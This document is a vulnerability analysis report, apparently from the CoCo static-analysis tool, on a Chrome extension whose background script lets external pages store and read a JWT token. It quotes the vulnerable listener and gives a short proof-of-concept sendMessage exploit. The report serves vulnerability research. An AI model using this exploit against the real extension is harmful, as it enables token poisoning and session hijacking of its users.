# CoCo Analysis: igfmkjfpbhaoifldimfikkbcfamedpim

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/igfmkjfpbhaoifldimfikkbcfamedpim/opgen_generated_files/bg.js
Line 991: `chrome.storage.local.set({ jwtToken: request.token }, () => {`

**Code:**

```javascript
// Background script (bg.js) - Line 989-1010
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
  if (request.action === 'storeToken') {
    chrome.storage.local.set({ jwtToken: request.token }, () => { // ← attacker-controlled
      sendResponse({ status: 'success' });
    });
    return true;
  }

  if (request.action === 'getToken') {
    chrome.storage.local.get('jwtToken', (data) => {
      sendResponse({ token: data.jwtToken }); // ← sends stored data back to attacker
    });
    return true;
  }

  if (request.action === 'removeToken') {
    chrome.storage.local.remove('jwtToken').then(() => {
      sendResponse({ status: 'success' });
    })
    return true;
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any website/extension matching externally_connectable
// (localhost, *.linkedin.com, *.pristinedata.ai)
chrome.runtime.sendMessage(
  'igfmkjfpbhaoifldimfikkbcfamedpim',
  { action: 'storeToken', token: 'malicious_jwt_token' },
  (response) => console.log('Token stored:', response)
);

// Then retrieve the poisoned token
chrome.runtime.sendMessage(
  'igfmkjfpbhaoifldimfikkbcfamedpim',
  { action: 'getToken' },
  (response) => console.log('Retrieved token:', response.token)
);
```

**Impact:** Complete storage exploitation chain - attacker can poison storage with arbitrary JWT token via external message, then retrieve it back through sendResponse, enabling session hijacking or token manipulation.

---

## Sink 2: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/igfmkjfpbhaoifldimfikkbcfamedpim/opgen_generated_files/bg.js
Line 999: `sendResponse({ token: data.jwtToken });`

**Note:** This is the retrieval half of the complete storage exploitation chain described in Sink 1.

**Classification:** TRUE POSITIVE (part of the same vulnerability)

**Reason:** This sink completes the storage exploitation chain - the attacker-controlled token stored in Sink 1 flows back to the attacker through sendResponse, making the storage poisoning exploitable.

---
